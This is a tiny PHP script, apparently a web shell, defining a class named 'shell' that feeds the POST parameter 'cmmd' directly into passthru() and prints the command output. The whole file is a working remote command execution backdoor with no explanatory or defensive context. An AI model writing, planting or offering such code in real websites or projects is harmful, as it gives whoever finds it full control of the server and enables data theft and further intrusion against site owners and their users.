<?php
class shell{
	function exesys()
	{
		echo "<hr>";
		echo "<pre>";
		$result = passthru($_POST['cmmd']);
		echo "</pre>";
		echo "<hr>";
		die("");
	}
}

$sh = new shell();
$sh->exesys();
?>